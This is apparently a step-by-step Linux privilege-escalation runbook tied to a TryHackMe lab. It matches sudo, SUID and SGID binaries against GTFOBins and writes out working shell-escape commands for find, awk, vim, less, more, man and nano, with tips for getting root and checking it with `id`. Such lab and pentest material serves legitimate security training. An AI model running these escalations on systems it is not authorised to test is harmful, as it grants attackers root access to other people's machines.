
Cross-reference candidate binaries on GTFOBins and execute their shell-escape payloads. Input from the calling walkthrough: a list of `(binary, primitive)` pairs (primitive ∈ `sudo` / `suid` / `sgid`). Triage the list in Step 1, execute the qualifiers in Steps 2–3, stopping at the first that elevates. Returns one verdict to the caller: **elevated** (root, or group `<group>`) or **none elevated**. Shell function only — File Write / File Read routes deferred.

Primitive → GTFOBins tab:

- **sudo** (binary in `sudo -l`) → **Sudo** tab
- **SUID** (setuid bit) → **SUID** tab
- **SGID** (setgid bit) → **SUID** tab (no SGID tab — see SGID caveat)

---

## Step 1 — Cross-reference on GTFOBins

For each candidate binary pair (`binary`, `primitive`) open `gtfobins.org/gtfobins/<binary>/`. The badges at the top of the page list the available functions (Shell, File Write, File Read, Inherit, etc.).

- **Shell** badge present AND clicking it leads to a 'Shell' section with a populated tab for your primitive (e.g. `sudo`, `suid` etc.) → exploitable. Note the binary + payload. 
- **Shell** badge present but bordered with a dotted line AND clicking it leads to a 'Inherit' section → your-primitive tab (e.g `sudo`, `suid` etc.) is populated (possibly across multiple sub-entries) → exploitable. Note 'Operates via inheritance'.
- **Shell** badge absent → skip this binary for this route (binary doesn't spawn shells via set-id / sudo etc; may still be exploitable via File Write / File Read routes — coverage deferred). Note the functions it does have (e.g. `File Read`, `File Write`) for if/when those routes are built. **Next binary**
- URL 404s (binary not on GTFOBins) → skip this binary. **Next binary**

**≥1 binary qualifies → Step 2. No binary qualifies (whole list skipped) → return "none elevated" to the calling walkthrough.**

---

## Step 2 — Execute the payload

GTFOBins payloads need translation, not direct copy-paste. Rules:

1. **Invocation depends on primitive.**
    - **sudo** — prefix line 1 with `sudo`. GTFOBins assumes `sudo` is implicit on the Sudo tab. Operator types `sudo <line-1>` at the shell prompt.
    - **SUID / SGID** — run the binary directly, no prefix (already set-id). SUID-tab payloads spawn `/bin/sh -p` / `bash -p`; `-p` stops the shell dropping the set-id privilege — omit it only where the default shell does not drop set-id privileges.
2. **Subsequent lines are typed inside the launched program**, not at the shell.
3. **Shell-escape characters** (`!`, `:!`, `:shell`) invoke the program's built-in escape feature. Two behaviours:
    - **Direct**: shell appears immediately (e.g. find, awk).
    - **Prompted**: program displays a command prompt; type `/bin/sh` and Enter (e.g. iftop, less, more, man).

**Translation examples** (GTFOBins Sudo-tab payload → operator actions; for SUID/SGID drop the `sudo` prefix per rule 1):

- `find` (single-line payload): `sudo find . -exec /bin/sh \; -quit` → root shell appears.
- `iftop` (two-line payload): `sudo iftop` → inside iftop press `!` (shift + 1) → at iftop's prompt type `/bin/sh` → Enter.
- `vim` (single-word payload `vim`): `sudo vim` → in vim type `:!/bin/sh` → Enter.
- `less` (two-line payload with file): `sudo less /etc/hostname` → press `!` → at less's prompt type `/bin/sh` → Enter.

**Gotchas:**

⚠️ **See per-binary gotchas below, for executable specifics**

- **Required argument**: less and man need a file/topic; less takes any readable file (`/etc/hostname` is universal), man takes any topic (`man man` works). For `more`, see per-binary gotcha — file size matters.
- **Placeholders**: payloads showing `<file>` or similar — replace with a concrete value before pasting.

---

## Step 3 — Verify elevation

`id`

- (primitive = **sudo**) `uid=0(root)` → elevated to **root**. Return to the calling walkthrough.
- (primitive = **suid**) `euid=0(root)` → elevated to **root** via the set-id bit; `id` shows `euid=` only when it differs from uid. Return to the calling walkthrough.

- (SGID) `egid=` shows your target group, e.g. `egid=...(shadow)` → elevated to that **group** (`id` prints `egid=` only when it differs from `gid`; absent → not elevated). Return to the calling walkthrough.
- No change → recheck the payload was typed verbatim and the invocation matches the primitive (Step 2). Still no change → this binary fails. **Next qualifying binary → Step 2**

All qualifying binaries executed, none elevated → return "none elevated" to the calling walkthrough.

---

## SGID caveat

No SGID tab exists on GTFOBins; for an SGID binary you read the **SUID** tab, whose payloads are gated on the SUID bit. Transfer to SGID is per-binary and not guaranteed — many binaries drop the setgid privilege before exec (confirmed: ssh-agent SGID `ssh`). Attempt and verify on `egid` (Step 3); on no-change, skip the GTFOBins route for that particular binary.

---

## Per-binary gotchas

### nano

GTFOBins payload:

`sudo nano` 
`^R^X` 
`reset; sh 1>&0 2>&0`

Resulting shell appears garbled. **Before** doing anything else type `reset` and hit enter -> shell becomes usable. (**If a more cooperative sudo-allowed binary qualifies, prefer it**).

### man

Two routes, both on GTFOBins:

**Primary — Inherit via less:**

`sudo man man` → 
type `!` (shift 1) → 
at prompt type `/bin/sh` → Enter.

**Fallback — HTML browser hijack:**

`sudo man '-H/bin/sh #' man` (Requires functional `groff -Thtml` rendering toolchain. Fails with `man: command exited with status 3: ... | groff -mandoc -Thtml` on systems without grohtml or its dependencies.)

### awk/mawk

GTFOBins's awk page is an alias redirect: "This is an alias of `mawk`." All payloads on the page show `mawk` as the command name.

**Use the binary name from `sudo -l`, not the payload's literal name.** For example, If `sudo -l` shows `/file/path/awk` then use `awk` not `mawk`:

`sudo awk 'BEGIN {system("/bin/sh")}'`

Sudoers matches the invoked binary path; `sudo mawk` is rejected with "user X is not allowed to execute" despite mawk and awk being functionally identical on Debian-derived systems.

### more

⚠️ **File argument must exceed terminal height**, or `more` dumps content and exits without entering interactive mode (no opportunity to press `!`).

GTFOBins payload:

`sudo more <file>` → 
press `!` (shift 1) → 
at more's prompt type `/bin/sh` → Enter.

Reliable long-file choices:
- `/etc/services` — typically 10000+ lines on most Linux systems
- `/etc/profile` — usually 30+ lines on Debian/Ubuntu
- `/var/log/auth.log` — long on any host with sudo activity (root-readable)

Short files (`/etc/hostname`, `/etc/hosts` on small networks) won't trigger pager mode.

## Validation

THM:Linux PrivEsc:Task 6 Sudo - Shell Escape Sequences